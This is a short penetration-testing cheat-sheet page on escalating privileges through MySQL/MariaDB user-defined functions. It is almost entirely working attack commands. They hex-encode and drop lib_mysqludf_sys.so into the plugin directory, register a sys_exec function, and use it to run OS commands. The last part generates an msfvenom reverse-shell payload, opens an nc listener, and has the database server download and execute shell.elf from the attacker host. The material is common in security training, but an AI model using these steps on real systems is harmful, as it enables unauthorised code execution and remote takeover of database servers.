---
description: PrivEsc with MySQL User Defined Functions
---

# HEX

If we can not access bash(or similar) shell but we can access mysql shell, you can upload library as hex format. The arch should be x86\_64 for this library file.

```
$ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex

$ mysql --host=127.0.0.1 --port=3306 -u root -p

MariaDB [(none)]> select @@plugin_dir;  #(OR -> show variables like '%plugin%';)

MariaDB [(none)]> set @shell = 0x{HEX FILE};

MariaDB [(none)]> select binary @shell into dumpfile '{plugin_directory}udf_sys_exec.so';

MariaDB [(none)]> create function sys_exec returns int soname 'udf_sys_exec.so';

MariaDB [(none)]> select * from mysql.func where name='sys_exec';
+----------+-----+-----------------+----------+
| name     | ret | dl              | type     |
+----------+-----+-----------------+----------+
| sys_exec |   2 | udf_sys_exec.so | function |
+----------+-----+-----------------+----------+

MariaDB [(none)]> select sys_exec("wget 192.168.1.1");
+------------------------------+
| sys_exec("wget 192.168.1.1") |
+------------------------------+
|                            0 |
+------------------------------+

192.168.1.2 - - [01/Jan/1970 00:00:01] "GET / HTTP/1.1" 200 - - Working

$ msfvenom -p linux/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
$ nc -nvlp 443

MariaDB [(none)]> select sys_exec("wget 192.168.1.1/shell.elf");
MariaDB [(none)]> select sys_exec("chmod +x shell.elf");
MariaDB [(none)]> select sys_exec("./shell.elf");
```
